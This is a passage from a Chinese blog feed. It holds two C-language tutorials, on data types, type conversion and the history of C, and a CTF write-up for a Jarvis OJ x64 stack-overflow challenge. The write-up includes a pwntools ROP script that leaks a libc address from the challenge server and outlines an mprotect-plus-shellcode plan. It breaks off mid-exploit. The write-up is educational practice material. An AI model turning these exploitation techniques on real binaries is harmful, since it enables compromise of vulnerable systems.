rel="noopener"><code>IEEE-754</code></a>标准，我们可以知道浮点数是以如下方式进行存储的：</p></blockquote><p><img src="/images/131-4.png" alt></p><blockquote><p>既然我们知道了相关的存储方式<sup>[2]</sup>，那么机器如何操作的呢？下面我们还是一上面的程序为例，看一下相关的汇编代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ……</span><br><span class="line">   0x565561b0 &lt;+23&gt;:    add    eax,0x2e50</span><br><span class="line">   0x565561b5 &lt;+28&gt;:    fld    DWORD PTR [eax-0x1fe4]</span><br><span class="line">=&gt; 0x565561bb &lt;+34&gt;:    fstp   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561be &lt;+37&gt;:    fld    DWORD PTR [eax-0x1fe0]</span><br><span class="line">   0x565561c4 &lt;+43&gt;:    fstp   DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561c7 &lt;+46&gt;:    fld    DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561ca &lt;+49&gt;:    fld    DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561cd &lt;+52&gt;:    sub    esp,0xc</span><br><span class="line">   ……</span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>fld</code>、<code>fstp</code>指令是没有接触过，那么这里就简单介绍一下：</p></blockquote><p><code>fld指令</code></p><blockquote><p><code>指令格式</code>：FLD　STReg/MemReal    （STReg是处理器堆栈寄存器ST(0)~ST(7)）</p><p><code>指令功能</code>：将<strong>浮点数据压入<a href="https://zh.wikipedia.org/zh-hans/%E8%BC%94%E5%8A%A9%E8%99%95%E7%90%86%E5%99%A8" target="_blank" rel="noopener">协处理器</a>的堆栈中</strong>。当进行内存单元内容压栈时，系统会自动决定传送数据的精度。比如：用DD或REAL4定义的内存单元数值是单精度数等，类似于指令push</p></blockquote><p><code>fst指令</code>：</p><blockquote><p><code>指令格式</code>：FST STReg/MemReal</p><p><code>指令功能</code>：将<strong>协处理器堆栈栈顶的数据传送到目标操作数</strong>中。在进行数据传送时，系统自动根据控制寄存器中舍入控制位的设置把栈顶浮点数舍入成相应精度的数据。</p></blockquote><p><code>fstp指令</code></p><blockquote><p><code>指令格式</code>：FSTP STReg/MemReal</p><p><code>指令功能</code>：与FST相类似，所不同的是：指令FST执行完后，<strong>不进行堆栈的弹出操作</strong>，即：<strong>堆栈不发生变化</strong>，而指令FSTP执行完后，则需要进行堆栈的弹出操作，堆栈将发生变化。</p></blockquote><h3 id="font-color-navy0x01-数据常量font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-数据常量font"></a> <font color="navy"><code>0x01 数据常量</code></font></h3><h4 id="font-color-blue1字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue1字符和字符字面值font"></a> <font color="blue"><code>1.字符和字符字面值</code></font></h4><p>      从一个程序开始我们的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">char</span> b = <span class="string">'b'</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0x63</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a = %d(d) = %c(c)\n"</span>,a,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] c = %d(d) = %c(c)\n"</span>,c,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] d = %d(d) = %c(c)\n"</span>,d,d);</span><br><span class="line">    b--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b-1 = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] a = 97(d) = a(c)</span><br><span class="line">[*] b = 98(d) = b(c)</span><br><span class="line">[*] c = 99(d) = c(c)</span><br><span class="line">[*] d = 100(d) = d(c)</span><br><span class="line">[*] b-1 = 97(d) = a(c)</span><br></pre></td></tr></table></figure><p>      字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul><p><code>总结</code></p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><h3 id="font-color-navy0x02-数据类型转换font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-数据类型转换font"></a> <font color="navy"><code>0x02 数据类型转换</code></font></h3><h4 id="font-color-blue1类型提升font"><a class="markdownIt-Anchor" href="#font-color-blue1类型提升font"></a> <font color="blue"><code>1.类型提升</code></font></h4><p>      首先举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">short</span> a= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> c;</span><br><span class="line">b = a;</span><br><span class="line">c = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]          short a = %d(d) = %u(u)\n"</span>,a,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned short b = %d(d) = %u(u)\n"</span>,b,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned int c = %d(d) = %u(u)\n"</span>,c,b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*]          short a = -1(d) = 4294967295(u)</span><br><span class="line">[*] unsigned short b = 65535(d) = 65535(u)</span><br><span class="line">[*] unsigned int c = -1(d) = 4294967295(u)</span><br></pre></td></tr></table></figure><p>      分析<code>printf的输出</code>，如下图：</p><p><img src="/images/131-5.png" alt></p><p><code>总结</code></p><blockquote><ul><li>有符号数按照有符号数的扩展规则（<strong>高位补符号位</strong>）扩展，无符号数按照无符号数的扩展规则（<strong>高位补0</strong>）扩展</li><li><strong>整型提升都解释为int</strong></li></ul></blockquote><h4 id="font-color-blue2类型降格font"><a class="markdownIt-Anchor" href="#font-color-blue2类型降格font"></a> <font color="blue"><code>2.类型降格</code></font></h4><p>      关于类型降格的相关知识点我只简单总结一下，大家可以自己写示例代码进行验证</p><blockquote><ul><li>当实数（浮点数）转换为整数时，实数的小数部分被全被舍去，只保留整数部分</li><li>当double类型转换为float类型，将去掉多余的数字，但按照四舍五入进行处理，这种会降低精度</li></ul></blockquote><h4 id="font-color-blue3显示转换font"><a class="markdownIt-Anchor" href="#font-color-blue3显示转换font"></a> <font color="blue"><code>3.显示转换</code></font></h4><p>      显示转换的方法有：<code>强制类型转换</code></p><h4 id="font-color-blue4隐式转换font"><a class="markdownIt-Anchor" href="#font-color-blue4隐式转换font"></a> <font color="blue"><code>4.隐式转换</code></font></h4><p>      隐式转换的方法有：</p><p><code>赋值转换</code></p><blockquote><p>通过赋值语句使符号右边表达式的值的类型自动转换为其左边变量的类型，如我们在类型提升中程序里面有关赋值的语句，如</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">3</span>,b;</span><br><span class="line">    <span class="keyword">short</span> i = <span class="number">4</span>,j;</span><br><span class="line">    j = a;<span class="comment">// int =&gt; short 类型降格</span></span><br><span class="line">    b = i;<span class="comment">// short =&gt; int 类型提升</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>一元转换</code></p><blockquote><p>将短型数扩展成机器处理的长度</p></blockquote><p><code>二元转换</code></p><blockquote><p>按照优先级顺序将各二元运算符的操作数提升为同一类型，长类型的优先级大于短类型的优先级</p></blockquote><p><code>输出转换</code></p><blockquote><p>比如我们前面讲到的<code>printf()</code>的格式符<code>%d</code>，是将数据类型提升/降格为<code>signed int</code>类型</p></blockquote><h3 id="font-colornavy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-colornavy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/30395946" target="_blank" rel="noopener">计算机补码运算背后的数学原理是什么？</a></p><p>[2] <a href="https://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html" target="_blank" rel="noopener">浮点数的二进制表示</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基本数据类型font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基本数据类型font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列一】 重新认识 C 语言</title>
    <link href="https://muzibing.github.io/2020/06/22/2020.06.22%EF%BC%88130%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/22/2020.06.22（130）/</id>
    <published>2020-06-21T16:00:00.000Z</published>
    <updated>2020-06-22T06:32:08.549Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy1c语言的历史font"><a class="markdownIt-Anchor" href="#font-color-navy1c语言的历史font"></a> <font color="navy"><code>1.C语言的历史</code></font></h3><p>      贝尔实验室的<code>Dennis Ritchie</code><font size="2">（1941－2011年）</font>为了给在<code>PDP-11</code>电脑上运行的Unix系统设计出一个系统级的编程语言，他在B语言的基础上创造了C语言，这是一门<code>高级编程语言</code>。</p><p><code>1969-1973年：早期的C语言</code></p><blockquote><ul><li><font size="2"><code>1969年</code>：<strong>基于 BCPL 创建 B</strong> ，以作为 Unix 的系统程序语言替代 PDP-7 汇编器</font></li><li><font size="2"><code>1971年</code>：于将 B 移植到<code>PDP-11</code> 时创建 NB （新“ B ”），也就是C语言的前身</font></li><li><font size="2"><code>1972年</code>：语言更名为 C</font></li><li><font size="2"><code>1973年</code>：Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上</font></li></ul></blockquote><p>      C语言源于<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL语言</a>，后者由<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>（Martin Richards）于1967年左右设计实现。BCPL是一门&quot;无类型&quot;的编程语言：它仅能操作一种数据类型，即<a href="https://zh.wikipedia.org/wiki/%E5%AD%97_(%E8%AE%A1%E7%AE%97%E6%9C%BA)" target="_blank" rel="noopener">机器字</a>（machine word）。1970年，肯·汤普逊为运行在<a href="https://zh.wikipedia.org/wiki/PDP-7" target="_blank" rel="noopener">PDP-7</a>上的首个Unix系统设计了一个精简版的BCPL，这个语言被称为<a href="https://zh.wikipedia.org/wiki/B%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">B语言</a>，它也是无类型的。</p><p><br>      Unix最早运行在PDP-7上，是以<a href="https://zh.wikipedia.org/wiki/%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">汇编语言</a>写成，在PDP-11出现后，丹尼斯·里奇与<a href="https://zh.wikipedia.org/wiki/%E8%82%AF%C2%B7%E6%B1%A4%E6%99%AE%E9%80%8A" target="_blank" rel="noopener">肯·汤普逊</a>着手将<a href="https://zh.wikipedia.org/wiki/Unix" target="_blank" rel="noopener">Unix</a>移植到PDP-11上，无类型的语言在<code>PDP-11</code>上愈发显得不合适。PDP-11提供了多种不同规格大小的基本对象：一字节长的字符，两字节长的整型数以及四字节长的浮点数。B语言无法处理这些不同规格大小的对象，也没有提供单独的操作符去操作它们。</p><p><br>      C语言最初尝试通过向B语言中增加数据类型的想法来处理那些不同类型的数据。和大多数语言一样，在C中，每个对象都有一个类型以及一个值；类型决定了可用于值的操作的含义，以及对象占用的存储空间大小。</p><p><br>      1973年，Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上。</p><p><br><code>1974-至今：标准的C</code></p><blockquote><ul><li><font size="2"><code>1975年</code>：C语言开始移植到其他机器上使用</font></li><li><font size="2"><code>1978年</code>：<a href="https://zh.wikipedia.org/wiki/%E4%B8%B9%E5%B0%BC%E6%96%AF%C2%B7%E9%87%8C%E5%A5%87" target="_blank" rel="noopener">丹尼斯·里奇</a>和<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E8%90%8A%E6%81%A9%C2%B7%E6%9F%AF%E6%9E%97%E6%BC%A2" target="_blank" rel="noopener">布莱恩·柯林汉</a>合作出版了《<a href="https://zh.wikipedia.org/wiki/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80_(%E4%B9%A6)" target="_blank" rel="noopener">C程序设计语言</a>》( The C Programming Language )的第一版</font></li></ul></blockquote><hr><p>      下面给出一个C语言的发展时间轴：</p><p><img src="/images/130-1.jpg" alt></p><blockquote><ul><li><font size="2"><code>1954年-Fortran</code>：是世界上第一个被正式采用并流传至今的<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E9%9A%8E%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">高级编程语言</a>，由IBM开发完成</font></li><li><font size="2"><code>1958年-IAL(ALGOL)</code>：ALGOL被设计用来避免FORTRAN中一些已知的问题，最终引领了许多其它编程语言的兴起，包括<a href="https://zh.wikipedia.org/wiki/PL/I" target="_blank" rel="noopener">PL/I</a>、<a href="https://zh.wikipedia.org/wiki/Simula" target="_blank" rel="noopener">Simula</a>、<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL</a>、<a href="https://zh.wikipedia.org/wiki/B%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">B</a>、<a href="https://zh.wikipedia.org/wiki/Pascal_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">Pascal</a>及<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">C</a></font></li><li><font size="2"><code>1958年-ALGOL58</code>：由IAL（国际代数语言，International Algebraic Language）改名而来。<a href="https://zh.wikipedia.org/wiki/ALGOL" target="_blank" rel="noopener">ALGOL</a>家族的第一个成员。它在1958年问世，<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>即是它的基础上开发而成</font></li><li><font size="2"><code>1960年-ALGOL60</code>：ALGOF60是一种面向问题的高级语言，它离硬件比较远，不宜用来编写系统程序。</font></li><li><font size="2"><code>1963年-CPL</code>：CPL是1963年剑桥大学发明的，CPL语言在<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>的基础上更接近硬件一些，但规模比较大，难以实现</font></li><li><font size="2"><code>1967年-BCPL</code>：是一种计算机程序设计语言，源自更早的<a href="https://zh.wikipedia.org/wiki/CPL_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">CPL</a>语言，1966年由剑桥大学的<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>所发展出来的。Richards试着移除了CPL中最复杂的组成，第一支BCPL compiler在<a href="https://zh.wikipedia.org/w/index.php?title=IBM_7094&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">IBM 7094</a>电脑中完成</font></li><li><font size="2"><code>1969年-B</code>：贝尔实验室的Ken Thompson（肯·汤普森） 对BCPL又做了改进，设计出了简单的且接近硬件的B语言，并用B语言写了第一个UNIX OS。</font></li><li><font size="2"><code>1971年-C</code>：贝尔实验室的另外一个人Dennis MacAlistair Ritchie（D.M.Ritchie - DM里奇）在B的基础上设计出了C语言。C 保持了B的优点（精炼、接近硬件），又克服了他的缺点（过于简单，数据无类型），至此C语言渐渐发展成为目前世界上最常用的编程语言之一。</font></li></ul></blockquote><h3 id="font-color-navy2重新学习c语言的理由font"><a class="markdownIt-Anchor" href="#font-color-navy2重新学习c语言的理由font"></a> <font color="navy"><code>2.重新学习C语言的理由</code></font></h3><p>      接触C语言是在大一上学期，这也是我第一次接触编程，那个时候对C语言的学习可真谓云里雾里，对于C语言中一些知识点不能够很好的知道其原理，比如<code>一个程序的变量被存放在哪里了？指针到底是个什么东西？</code>等等一系列问题，导致在学习过程中可谓困难重重，对计算机慢慢产生了畏难情绪。在经过一段时间的学习，我认为在学习C语言之前更应该先去学习计算机中的一些理念和想法，比如<code>可执行文件的加载过程；程序是如何被运行的；在程序运行过程中，栈扮演了什么样的角色？</code>等等，所以在简单的了解了这些原理以后，我决定再来重新学习C语言，以便彻底的了解其整个运行机制和原理。</p><p>      我参考的书籍有：《C语言程序设计语言》(第2版)和《C语言程序设计教程》(第3版)</p><h3 id="font-color-navy3学习计划font"><a class="markdownIt-Anchor" href="#font-color-navy3学习计划font"></a> <font color="navy"><code>3.学习计划</code></font></h3><p>     现在计划10期将C语言学完，每一期的计划如下：</p><blockquote><p>第一期：数据类型</p><p>第二期：流程控制</p><p>第三期：函数和程序结构</p><p>第四期：数组</p><p>第五期：指针（上）</p><p>第六期：指针（下）</p><p>第七期：结构（体）</p><p>第八期：链表</p><p>第九期：文件</p><p>第十期：总结</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy1c语言的历史font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1c语言的历史font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;1.C语言的历史&lt;/
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Jarvis OJ-PWN】level5（x64下的栈溢出漏洞）</title>
    <link href="https://muzibing.github.io/2020/06/20/2020.06.20%EF%BC%88129%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/20/2020.06.20（129）/</id>
    <published>2020-06-19T16:00:00.000Z</published>
    <updated>2020-06-20T15:29:43.370Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/129-1.jpg" alt></p><h3 id="font-color-brown0x00-相关知识font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-相关知识font"></a> <font color="brown"><code>0x00 相关知识</code></font></h3><h4 id="font-color-navy1mprotect函数font"><a class="markdownIt-Anchor" href="#font-color-navy1mprotect函数font"></a> <font color="navy"><code>1.mprotect()函数</code></font></h4><p>      <code>mprotect()</code>函数可以修改调用进程内存页的保护属性。如果调用进程尝试以违反保护属性的方式访问该内存，则内核会发出一个<code>SIGSEGV</code>信号给该进程。</p><ul><li><p>函数原型：<code>int mprotect(const void *start, size_t len, int prot)</code></p></li><li><p>参数解释：</p><ul><li>start：需改写属性的内存中开始地址</li><li>len：需改写属性的内存长度</li><li>prot：需要修改为的指定值</li></ul></li><li><p>功能： mprotect()函数可以用来修改一段指定内存区域的保护属性。 他把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>1）PROT_READ：表示内存段内的内容可写；</p><p>2）PROT_WRITE：表示内存段内的内容可读；</p><p>3）PROT_EXEC：表示内存段中的内容可执行；</p><p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p></li><li><p><code>注意</code>：指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p>prot=7 是可读可写可执行</p></li></ul><h4 id="font-color-navy2_libc_csu_init通用gadgetfont"><a class="markdownIt-Anchor" href="#font-color-navy2_libc_csu_init通用gadgetfont"></a> <font color="navy"><code>2.&lt;_libc_csu_init&gt;通用gadget</code></font></h4><blockquote><p>详情可以看一下我前面写过的一篇<a href="https://muzibing.github.io/2020/06/17/2020.06.17%EF%BC%88128%EF%BC%89/">博文</a></p></blockquote><h3 id="font-color-brown0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-brown0x01-题目分析font"></a> <font color="brown"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file level3_x64 </span><br><span class="line">level3_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec level3_x64 </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Jarvis OJ/pwn/level5/level3_x64&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护，下面看一下伪代码</p></blockquote><p><img src="/images/129-2.png" alt></p><p><img src="/images/129-3.png" alt></p><blockquote><p>从上面的伪代码中很容易看出<code>vul()</code>函数存在着栈溢出漏洞，<code>buf</code>能输入的值要远远大于被分配的值，所以漏洞点在这。但是由于<code>system()</code>函数和<code>execve()</code>函数被禁用了，也就是说我们无法通过这两个函数执行shellcode，那么题目给了提示<code>请尝试使用mmap和mprotect完成本题。</code>，对于<code>mmap</code>函数还不太了解，所以在这里我们使用<code>mprotect()</code>函数，该函数可以修改调用进程内存页的保护属性，那么我们以将我们的shellcode放入<code>.bss</code>段中，然后将<code>.bss</code>段的权限修改为可执行，然后再跳转到<code>.bss</code>段执行shellcode，那么下面我们怎么将shellcode写入<code>.bss</code>段中呢？</p></blockquote><p><code>1.将mprotect的地址和shellcode写入.bss段中</code></p><p>      我们可以利用read函数将shellcode写入<code>.bss</code>段中，之所以也将<code>mprotect</code>函数的地址也写入<code>.bss</code>段中，是因为通用gadget中的<code>callq *(%r12,%rbx,8)</code>，如果rbx为0，那么这里就是将r12中表示的地址的值作为函数地址，比如<code>r12 = 1</code>，而地址1中的值为<code>2</code>，那么就是调用地址<code>2</code>中的函数，这一点需要注意</p><p><code>2.使用mprotect()函数修改.bss段的权限</code></p><p>      第一个参数start是<code>.bss</code>的起始地址，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p><code>3.执行shellcode</code></p><h3 id="font-color-brown0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown0x02-解题步骤font"></a> <font color="brown"><code>0x02 解题步骤</code></font></h3><h4 id="font-color-navy1泄露write的真实地址font"><a class="markdownIt-Anchor" href="#font-color-navy1泄露write的真实地址font"></a> <font color="navy"><code>1.泄露write的真实地址</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak write real address </span></span><br><span class="line">payload1 = bytes(<span class="number">0x88</span> * <span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u64(r.recv()[:<span class="number">8</span>])</span><br><span class="line">print(<span class="string">"[+] write real addr:"</span>,hex(write_addr))</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发送完payload1后，栈中的情况如下：</p></blockquote><p><img src="/images/129-4.png" alt></p><h4 id="font-color-navy2找出mprotect真实地址font"><a class="markdownIt-Anchor" href="#font-color-navy2找出mprotect真实地址font"></a> <font color="navy"><code>2.找出mprotect真实地址</code></font></h4><figure class="highlight 